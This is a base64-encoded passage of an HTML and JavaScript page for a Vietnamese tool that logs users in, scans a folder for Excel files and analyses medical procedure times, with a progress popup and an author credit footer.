lY29uZHMgPSAwOw0KICAgICAgICAgICAgICAgICAgICBpZiAodGltZVBhcnQuaW5jbHVkZXMoJzonKSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZVBhcnRzID0gdGltZVBhcnQuc3BsaXQoJzonKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGhvdXJzID0gcGFyc2VJbnQodGltZVBhcnRzWzBdKSB8fCAwOw0KICAgICAgICAgICAgICAgICAgICAgICAgbWludXRlcyA9IHBhcnNlSW50KHRpbWVQYXJ0c1sxXSkgfHwgMDsNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHMgPSBwYXJzZUludCh0aW1lUGFydHNbMl0pIHx8IDA7DQogICAgICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpc05hTihob3VycykgfHwgaXNOYU4obWludXRlcykgfHwgaXNOYU4oc2Vjb25kcykgfHwgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaG91cnMgPCAwIHx8IGhvdXJzID4gMjMgfHwgbWludXRlcyA8IDAgfHwgbWludXRlcyA+IDU5IHx8IHNlY29uZHMgPCAwIHx8IHNlY29uZHMgPiA1OSkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvZ0Vycm9yKCdHacOhIHRy4buLIHRo4budaSBnaWFuIGtow7RuZyBo4bujcCBs4buHJywgcm93SW5kZXgsIHsgdGltZTogdGltZVBhcnQgfSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgaG91cnMgPSAwOyBtaW51dGVzID0gMDsgc2Vjb25kcyA9IDA7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIGNvbnN0IGRhdGVPYmogPSBuZXcgRGF0ZSh5ZWFyLCBtb250aCAtIDEsIGRheSwgaG91cnMsIG1pbnV0ZXMsIHNlY29uZHMpOw0KICAgICAgICAgICAgICAgICAgICBpZiAoaXNOYU4oZGF0ZU9iai5nZXRUaW1lKCkpKSB0aHJvdyBuZXcgRXJyb3IoJ05nw6B5IGtow7RuZyBo4bujcCBs4buHJyk7DQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICBjb25zdCBzZWNvbmRzSW5EYXkgPSBob3VycyAqIDM2MDAgKyBtaW51dGVzICogNjAgKyBzZWNvbmRzOw0KICAgICAgICAgICAgICAgICAgICBjb25zdCBtaW51dGVzSW5EYXkgPSBob3VycyAqIDYwICsgbWludXRlczsNCiAgICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgICAgIHJldHVybiB7DQogICAgICAgICAgICAgICAgICAgICAgICBkYXRlT2JqLA0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0ZUtleTogYCR7ZGF5fS8ke21vbnRofS8ke3llYXJ9YCwNCiAgICAgICAgICAgICAgICAgICAgICAgIG1pbnV0ZXM6IG1pbnV0ZXNJbkRheSwNCiAgICAgICAgICAgICAgICAgICAgICAgIHNlY29uZHM6IHNlY29uZHNJbkRheSwNCiAgICAgICAgICAgICAgICAgICAgICAgIGRpc3BsYXlUaW1lOiBgJHtob3Vycy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7bWludXRlcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9OiR7c2Vjb25kcy50b1N0cmluZygpLnBhZFN0YXJ0KDIsICcwJyl9YA0KICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ8SQ4buLbmggZOG6oW5nIHRo4budaSBnaWFuIGtow7RuZyDEkcaw4bujYyBo4buXIHRy4bujJyk7DQogICAgICAgICAgICB9IGNhdGNoIChlcnJvcikgew0KICAgICAgICAgICAgICAgIGxvZ0Vycm9yKGBM4buXaSBwaMOibiB0w61jaCB0aOG7nWkgZ2lhbjogJHtlcnJvci5tZXNzYWdlfWAsIHJvd0luZGV4LCB7IA0KICAgICAgICAgICAgICAgICAgICB2YWx1ZTogZGF0ZXRpbWVTdHIsDQogICAgICAgICAgICAgICAgICAgIGVycm9yRGV0YWlsczogZXJyb3Iuc3RhY2sgDQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICAgICAgcmV0dXJuIG51bGw7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICAvLyA9PT09PT09PT09IEtI4bueSSBU4bqgTyBT4buwIEtJ4buGTiA9PT09PT09PT09IC8vDQogICAgICAgIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBmdW5jdGlvbigpIHsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3VzZXJuYW1lSW5wdXQnKS5mb2N1cygpOw0KICAgICAgICAgICAgLy8gS2hpIHRyYW5nIGxvYWQNCiAgICAgICAgICAgIGlmICghc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbSgnbWVkVXNlcicpKSB7DQogICAgICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5jbGFzc0xpc3QuYWRkKCdsb2dpbi1wYWdlJyk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEtp4buDbSB0cmEgxJHEg25nIG5o4bqtcCBraGkgdHJhbmcgdOG6o2kNCgkJDQoJCQkNCiAgICAgICAgICAgIGNoZWNrU2F2ZWRMb2dpbigpOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBuw7p0IMSRxINuZyBuaOG6rXANCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKCkgPT4gew0KICAgIGlzTG9naW5BY3Rpb24gPSB0cnVlOyAvLyDinIUgVGjDqm0gZMOybmcgbsOgeQ0KICAgIGNoZWNrTG9naW4oKTsNCn0pOw0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyBHw6FuIHPhu7Ega2nhu4duIGNobyBuw7p0IMSRxINuZyB4deG6pXQNCiAgICAgICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dvdXRCdG4nKS5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsICgpID0+IHsNCiAgICBpc0xvZ2luQWN0aW9uID0gZmFsc2U7IC8vIOKchSBUaMOqbSBkw7JuZyBuw6B5DQogICAgbG9nb3V0KCk7DQp9KTsNCg0KICAgICAgICAgICAgDQogICAgICAgICAgICAvLyDEkMSDbmcgbmjhuq1wIGLhurFuZyBwaMOtbSBFbnRlcg0KICAgICAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Bhc3N3b3JkSW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdrZXl1cCcsIGZ1bmN0aW9uKGV2ZW50KSB7DQogICAgICAgICAgICAgICAgaWYgKGV2ZW50LmtleSA9PT0gJ0VudGVyJykgew0KICAgICAgICAgICAgICAgICAgICBjaGVja0xvZ2luKCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfSk7DQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIG7DunQgcGjDom4gdMOtY2ggZmlsZQ0KICAgICAgICAgICAgDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgYXN5bmMgKCkgPT4gew0KICBhd2FpdCBlbnN1cmVYTFNYKCk7IC8vIG7huqFwIFhMU1ggxJHDum5nIGzDumMgZMO5bmcNCiAgICBjb25zdCBmaWxlID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpLmZpbGVzWzBdOw0KaWYgKCFmaWxlKSB7DQogICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gYA0KICAgICAgICA8aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6cmVkO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPg0KICAgICAgICA8c3Ryb25nPlZ1aSBsw7JuZyBjaOG7jW4gZmlsZSB0csaw4bubYyBraGkga2nhu4NtIHRyYTwvc3Ryb25nPjxici8+PGJyLz4NCiAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIiBvbmNsaWNrPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJykuc3R5bGUuZGlzcGxheT0nbm9uZSciPsSQw7NuZzwvYnV0dG9uPg0KICAgIGA7DQogICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSAnMCUnOw0KICAgIA0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQogICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KICAgIHJldHVybjsNCn0NCg0KDQogICAgY29uc3QgcG9wdXAgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1BvcHVwJyk7DQogICAgY29uc3QgbG9hZGluZ1RleHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbG9hZGluZ1RleHQnKTsNCiAgICBjb25zdCBwcm9ncmVzc0JhciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwcm9ncmVzc0JhcicpOw0KDQogICAgcG9wdXAuc3R5bGUuZGlzcGxheSA9ICdmbGV4JzsNCiAgICByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpKTsNCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLXBhcGVyLXBsYW5lIiBzdHlsZT0iZm9udC1zaXplOjI0cHg7Y29sb3I6IzM0OThkYjttYXJnaW4tYm90dG9tOjEwcHg7Ij48L2k+PGJyLz7EkGFuZyBn4butaSBk4buvIGxp4buHdSB24buBIG3DoXkgY2jhu6cuLi4nOw0KICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gJzMzJSc7DQoJDQoJDQoJDQoJY29uc3QgcHJvZ3Jlc3NCYXJDb250YWluZXIgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncHJvZ3Jlc3NCYXJDb250YWluZXInKTsNCg0KLy8gQ2jhu4kgdOG6oW8gMSBs4bqnbg0KaWYgKCFkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY3JlZGl0TGluZUJlbG93JykpIHsNCiAgY29uc3QgY3JlZGl0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnZGl2Jyk7DQogIGNyZWRpdC5pZCA9ICdjcmVkaXRMaW5lQmVsb3cnOw0KICBjcmVkaXQuaW5uZXJUZXh0ID0gJ8KpIFRoaeG6v3Qga+G6vyAmIHBow6F0IHRyaeG7g24gYuG7n2kgQ2jDonUgSHXhu7NuaCc7DQogIGNyZWRpdC5zdHlsZS5tYXJnaW5Ub3AgPSAnMTBweCc7DQogIGNyZWRpdC5zdHlsZS5mb250U2l6ZSA9ICcxNnB4JzsNCiAgY3JlZGl0LnN0eWxlLmNvbG9yID0gJyNGRjAwMDAnOw0KICBjcmVkaXQuc3R5bGUudGV4dEFsaWduID0gJ2NlbnRlcic7DQoNCiAgcHJvZ3Jlc3NCYXJDb250YWluZXIucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoY3JlZGl0LCBwcm9ncmVzc0JhckNvbnRhaW5lci5uZXh0U2libGluZyk7DQp9DQoJDQoJDQoJDQoJDQogICAgYXdhaXQgbmV3IFByb21pc2UocmVzb2x2ZSA9PiByZXF1ZXN0QW5pbWF0aW9uRnJhbWUoKCkgPT4gc2V0VGltZW91dChyZXNvbHZlLCA1MCkpKTsNCiAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgNzAwKSk7DQoNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICc2NiUnOw0KDQogICAgbGV0IHRvdGFsID0gMDsNCiAgICB0cnkgew0KICAgICAgICBjb25zdCBmaWxlUmVhZGVyID0gbmV3IEZpbGVSZWFkZXIoKTsNCiAgICAgICAgY29uc3QgZGF0YSA9IGF3YWl0IG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsNCiAgICAgICAgICAgIGZpbGVSZWFkZXIub25sb2FkID0gZSA9PiByZXNvbHZlKG5ldyBVaW50OEFycmF5KGUudGFyZ2V0LnJlc3VsdCkpOw0KICAgICAgICAgICAgZmlsZVJlYWRlci5vbmVycm9yID0gKCkgPT4gcmVqZWN0KG5ldyBFcnJvcigiTOG7l2kgxJHhu41jIGZpbGUiKSk7DQogICAgICAgICAgICBmaWxlUmVhZGVyLnJlYWRBc0FycmF5QnVmZmVyKGZpbGUpOw0KICAgICAgICB9KTsNCg0KICAgICAgICBjb25zdCB3b3JrYm9vayA9IFhMU1gucmVhZChkYXRhLCB7IHR5cGU6ICdhcnJheScgfSk7DQogICAgICAgIGNvbnN0IGZpcnN0U2hlZXQgPSB3b3JrYm9vay5TaGVldHNbd29ya2Jvb2suU2hlZXROYW1lc1sxXV07DQogICAgICAgIGNvbnN0IGpzb25EYXRhID0gWExTWC51dGlscy5zaGVldF90b19qc29uKGZpcnN0U2hlZXQsIHsNCiAgICAgICAgICAgIGhlYWRlcjogMSwNCiAgICAgICAgICAgIGRlZnZhbDogIiIsDQogICAgICAgICAgICBibGFua3Jvd3M6IHRydWUNCiAgICAgICAgfSk7DQoNCiAgICAgICAgY29uc3Qgcm93cyA9IGpzb25EYXRhLnNsaWNlKDkpOw0KICAgICAgICB0b3RhbCA9IHJvd3MubGVuZ3RoOw0KICAgIH0gY2F0Y2ggew0KICAgICAgICB0b3RhbCA9IDEwMDA7DQogICAgfQ0KDQogICAgY29uc3Qgc3RlcCA9IDEwMDsNCiAgICBjb25zdCBzdGVwcyA9IE1hdGguY2VpbCh0b3RhbCAvIHN0ZXApOw0KICAgIGNvbnN0IGludGVydmFsID0gMjYwMCAvIHN0ZXBzOw0KDQogICAgZm9yIChsZXQgaSA9IDE7IGkgPD0gc3RlcHM7IGkrKykgew0KICAgICAgICBjb25zdCBjdXJyZW50ID0gTWF0aC5taW4oaSAqIHN0ZXAsIHRvdGFsKTsNCiAgICAgICAgbG9hZGluZ1RleHQuaW5uZXJIVE1MID0gJzxpIGNsYXNzPSJmYXMgZmEtdXNlci1tZCIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOiMyOTgwYjk7bWFyZ2luLWJvdHRvbToxMHB4OyI+PC9pPjxici8+xJBhbmcgcGjDom4gdMOtY2ggZOG7ryBsaeG7h3UgdOG7q25nIGLhu4duaCBuaMOibi4uLjxicj4nICsgY3VycmVudCArICcgLyAnICsgdG90YWw7DQogICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCBpbnRlcnZhbCkpOw0KICAgIH0NCg0KICAgIGxvYWRpbmdUZXh0LmlubmVySFRNTCA9ICc8aSBjbGFzcz0iZmFzIGZhLWNoZWNrLWNpcmNsZSIgc3R5bGU9ImZvbnQtc2l6ZToyNHB4O2NvbG9yOmdyZWVuO21hcmdpbi1ib3R0b206MTBweDsiPjwvaT48YnIvPsSQw6Mga2nhu4NtIHRyYSB4b25nLi4uJzsNCiAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICcxMDAlJzsNCiAgICBhd2FpdCBuZXcgUHJvbWlzZShyZXNvbHZlID0+IHNldFRpbWVvdXQocmVzb2x2ZSwgMTAwMCkpOw0KDQppZiAoIXdpbmRvdy5pc0tob2FMb2kpIHsNCiAgICBwb3B1cC5jbGFzc0xpc3QucmVtb3ZlKCdzaG93Jyk7DQogICAgc2V0VGltZW91dCgoKSA9PiB7IHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnbm9uZSc7IH0sIDUwMCk7DQoNCg0KfQ0KDQoNCg0KIGVsc2Ugew0KICAgIC8vIE7hur91IMSRYW5nIGzhu5dpIEtob2EsIEtIw5RORyDEkcaw4bujYyDhuqluIHBvcHVwDQogICAgcG9wdXAuY2xhc3NMaXN0LmFkZCgnc2hvdycpOw0KICAgIHBvcHVwLnN0eWxlLmRpc3BsYXkgPSAnZmxleCc7DQp9DQogICAgaGFuZGxlRmlsZSgpOw0KCQ0KCQ0KCQ0KCQ0Kc2V0VGltZW91dCgoKSA9PiB7DQogICAgLy8g4p2MIE7hur91IMSRYW5nIGzhu5dpIHTDqm4ga2hvYSB0aMOsIGdp4buvIG5ndXnDqm4gcG9wdXAsIEtIw5RORyDEkcaw4bujYyDhuqluLCBLSMOUTkcgaGnhu4duIG7DunQNCiAgICBpZiAod2luZG93LmlzS2hvYUxvaSkgew0KICAgICAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ2ZsZXgnOw0KICAgICAgICBwb3B1cC5jbGFzc0xpc3QuYWRkKCdzaG93Jyk7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICAvLyDinIUgTuG6v3Uga2jDtG5nIGzhu5dpLCB0aMOsIOG6qW4gcG9wdXAgdsOgIGhp4buHbiBuw7p0IGNo4bupYyBuxINuZw0KICAgIHBvcHVwLmNsYXNzTGlzdC5yZW1vdmUoJ3Nob3cnKTsNCiAgICBwb3B1cC5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOw0KDQogICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uLmJ0bicpLmZvckVhY2goYnRuID0+IHsNCiAgICAgICAgaWYgKGJ0bi50ZXh0Q29udGVudC5pbmNsdWRlcygnR2nhu50gdHLhu5FuZycpIHx8IGJ0bi50ZXh0Q29udGVudC5pbmNsdWRlcygnU+G6r2MgdGh14buRYyB0aGFuZycpKSB7DQogICAgICAgICAgICBidG4uc3R5bGUuZGlzcGxheSA9ICdpbmxpbmUtYmxvY2snOw0KICAgICAgICB9DQogICAgfSk7DQp9LCA1MDApOw0KDQoNCgkNCn0pOw0KDQogICAgICAgICAgICANCiAgICAgICAgICAgIC8vIEfDoW4gc+G7sSBraeG7h24gY2hvIGRyb3Bkb3duIGzhu41jDQogICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBmaWx0ZXJCeU9wZXJhdG9yKTsNCiAgICAgICAgICAgIA0KCQkJDQoJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZmlsdGVyQnlPcGVyYXRvcik7DQoJCQkNCgkJCQ0KICAgICAgICAgICAgLy8gR8OhbiBz4buxIGtp4buHbiBjaG8gcmFkaW8gYnV0dG9uIGNo4buNbiBraHVuZyBnaeG7nQ0KICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnaW5wdXRbbmFtZT0idGltZU9wdGlvbiJdJykuZm9yRWFjaChyYWRpbyA9PiB7DQogICAgICAgICAgICAgICAgcmFkaW8uYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChhbGxQcm9jZWR1cmVzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGdlbmVyYXRlVGltZVN1Z2dlc3Rpb25zKGFsbFByb2NlZHVyZXMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgZmlsdGVyQnlPcGVyYXRvcigpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSk7DQogICAgICAgICAgICB9KTsNCgkJCQ0KCQkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ29wZXJhdG9yU2VsZWN0JykuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7DQogICAgZmlsdGVyQnlPcGVyYXRvcigpOw0KfSk7DQoNCiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3RFcnJvcicpLmFkZEV2ZW50TGlzdGVuZXIoJ2NoYW5nZScsIGZ1bmN0aW9uICgpIHsNCiAgIC8vIGNo4buJIHJlbmRlciBs4bqhaSwgS0jDlE5HIMSR4bulbmcgZHJvcGRvd24gYsOqbiBraWENCiAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiB9KTsNCgkJCQ0KICAgICAgICB9KTsNCiAgICA8L3NjcmlwdD4NCjxkaXYgY2xhc3M9InByb2NlZHVyZS1pbmZvIj48Y2VudGVyPiANCkRlc2lnbiBCeSA8YSBocmVmPSJodHRwOi8vZmIuY29tL2NoYXVodXluaDAxMDQiIHRhcmdldD0iX2JsYW5rIj4gRHIuQ2jDonU8L2E+PGJyLz4NCiAgICAgICAgICAgICAgICBO4bq/dSBDw7MgQuG6pXQgS+G7syBWxrDhu5tuZyBN4bqvYyBHw6wgVnVpIEzDsm5nIExIIDogPGJyLz4NCiAgICAgICAgICAgICAgICBFbWFpbDogY2hhdWh1eW5oMDEwNEBnbWFpbC5jb208YnIvPg0KICAgICAgICAgICAgICAgIFNEVDogMDc5LjU2Ny45MzUwPC9jZW50ZXI+DQo8L2Rpdj4NCg0KDQoNCjxzY3JpcHQ+DQogIC8vIEjhu5cgdHLhu6MgbmjhuqVuIEVudGVyIHThu6sgw7QgdXNlcm5hbWUgaG/hurdjIHBhc3N3b3JkDQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCd1c2VybmFtZUlucHV0JykuYWRkRXZlbnRMaXN0ZW5lcigna2V5dXAnLCBmdW5jdGlvbihldmVudCkgew0KICAgIGlmIChldmVudC5rZXkgPT09ICdFbnRlcicpIHsNCiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykuZm9jdXMoKTsNCiAgICB9DQogIH0pOw0KDQogIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZElucHV0JykuYWRkRXZlbnRMaXN0ZW5lcigna2V5dXAnLCBmdW5jdGlvbihldmVudCkgew0KICAgIGlmIChldmVudC5rZXkgPT09ICdFbnRlcicpIHsNCiAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dpbkJ0bicpLmNsaWNrKCk7DQogICAgfQ0KICB9KTsNCg0KLy8gPT09PT09IFThu7AgxJDhu5hORyBRVcOJVCBUSMavIE3hu6RDICYgQ0jhu4xOIEZJTEUgTeG7mkkgTkjhuqRUID09PT09PQ0KDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9sZGVyQnRuJykuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCAoKSA9PiB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZvbGRlcklucHV0JykuY2xpY2soKTsNCn0pOw0KDQpkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZm9sZGVySW5wdXQnKS5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBhc3luYyAoZSkgPT4gew0KIGF3YWl0IGVuc3VyZVhMU1goKTsgLy8gbuG6oXAgWExTWCB0csaw4bubYyBraGkgxJHhu41jIHdvcmtib29rDQogICAgY29uc3QgZmlsZXMgPSBBcnJheS5mcm9tKGUudGFyZ2V0LmZpbGVzKS5maWx0ZXIoZiA9PiAvXC4oeGxzeHx4bHN8Y3N2KSQvaS50ZXN0KGYubmFtZSkpOw0KICAgIGNvbnN0IHN0YXR1c0RpdiA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdzY2FuU3RhdHVzJyk7DQogICAgY29uc3QgZmlsZUlucHV0ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2ZpbGVJbnB1dCcpOw0KDQogICAgaWYgKGZpbGVzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBzdGF0dXNEaXYuc3R5bGUuY29sb3IgPSAncmVkJzsNCiAgICAgICAgc3RhdHVzRGl2LmlubmVySFRNTCA9ICdLaMO0bmcgdMOsbSB0aOG6pXkgZmlsZSBFeGNlbCBo4bujcCBs4buHIHRyb25nIHRoxrAgbeG7pWMuJzsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGxldCB2YWxpZEZpbGUgPSBudWxsOw0KDQogICAgZm9yIChjb25zdCBmaWxlIG9mIGZpbGVzLnNvcnQoKGEsIGIpID0+IGIubGFzdE1vZGlmaWVkIC0gYS5sYXN0TW9kaWZpZWQpKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBjb25zdCBkYXRhID0gYXdhaXQgZmlsZS5hcnJheUJ1ZmZlcigpOw0KICAgICAgICAgICAgY29uc3Qgd29ya2Jvb2sgPSBYTFNYLnJlYWQoZGF0YSwgeyB0eXBlOiAnYXJyYXknIH0pOw0KDQogICAgICAgICAgICBpZiAoIXdvcmtib29rLlNoZWV0TmFtZXNbMV0pIGNvbnRpbnVlOyAvLyBj4bqnbiBTaGVldCB0aOG7qSAyDQoNCiAgICAgICAgICAgIGNvbnN0IHNoZWV0ID0gd29ya2Jvb2suU2hlZXRzW3dvcmtib29rLlNoZWV0TmFtZXNbMV1dOw0KICAgICAgICAgICAgY29uc3QganNvbkRhdGEgPSBYTFNYLnV0aWxzLnNoZWV0X3RvX2pzb24oc2hlZXQsIHsgaGVhZGVyOiAxLCBkZWZ2YWw6ICIiLCBibGFua3Jvd3M6IHRydWUgfSk7DQoNCiAgICAgICAgICAgIGlmIChqc29uRGF0YS5sZW5ndGggPj0gMTApIHsgLy8gw610IG5o4bqldCAyIGTDsm5nIGhlYWRlciB2w6AgY8OzIGThu68gbGnhu4d1IGTDsm5nIDEwDQogICAgICAgICAgICAgICAgdmFsaWRGaWxlID0gZmlsZTsNCiAgICAgICAgICAgICAgICBicmVhazsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCAoZXJyKSB7DQogICAgICAgICAgICBjb25zb2xlLmVycm9yKGBM4buXaSDEkeG7jWMgZmlsZSAke2ZpbGUubmFtZX06YCwgZXJyKTsNCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGlmICh2YWxpZEZpbGUpIHsNCiAgICAgICAgY29uc3QgZHQgPSBuZXcgRGF0YVRyYW5zZmVyKCk7DQogICAgICAgIGR0Lml0ZW1zLmFkZCh2YWxpZEZpbGUpOw0KICAgICAgICBmaWxlSW5wdXQuZmlsZXMgPSBkdC5maWxlczsNCg0KICAgICAgICAvLyBj4bqtcCBuaOG6rXQgdHLhuqFuZyB0aMOhaQ0KICAgICAgICBzdGF0dXNEaXYuaW5uZXJIVE1MID0gYDxpIGNsYXNzPSJmYXMgZmEtZm9sZGVyLW9wZW4iPjwvaT4gxJDDoyBjaOG7jW4gZmlsZTogPGI+JHt2YWxpZEZpbGUubmFtZX08L2I+YDsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgICAgICBzdGF0dXNEaXYuc3R5bGUuY29sb3IgPSAnIzJjM2U1MCc7DQoNCiAgICAgICAgLy8gR+G7jWkga2nhu4NtIHRyYQ0KICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnYW5hbHl6ZUJ0bicpLmNsaWNrKCk7DQogICAgfSBlbHNlIHsNCiAgICAgICAgc3RhdHVzRGl2LnN0eWxlLmNvbG9yID0gJ3JlZCc7DQogICAgICAgIHN0YXR1c0Rpdi5pbm5lckhUTUwgPSAnS2jDtG5nIHTDrG0gxJHGsOG7o2MgZmlsZSBjw7MgY+G6pXUgdHLDumMgaOG7o3AgbOG7hy4gVnVpIGzDsm5nIGtp4buDbSB0cmEgbOG6oWkuJzsNCiAgICB9DQp9KTsNCg0KDQo8L3NjcmlwdD4NCjxkaXYgY2xhc3M9InRvYXN0IiBpZD0idG9hc3QiPjwvZGl2Pg0KPCEtLSBQb3B1cCBsb2FkaW5nIC0tPg0KPGRpdiBpZD0ibG9hZGluZ1BvcHVwIiBzdHlsZT0iZGlzcGxheTpub25lO3Bvc2l0aW9uOmZpeGVkO3RvcDowO2xlZnQ6MDt3aWR0aDoxMDAlO2hlaWdodDoxMDAlO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpO3otaW5kZXg6OTk5OTtqdXN0aWZ5LWNvbnRlbnQ6Y2VudGVyO2FsaWduLWl0ZW1zOmNlbnRlcjtmb250LWZhbWlseTonSW50ZXInLHNhbnMtc2VyaWYiPg0KP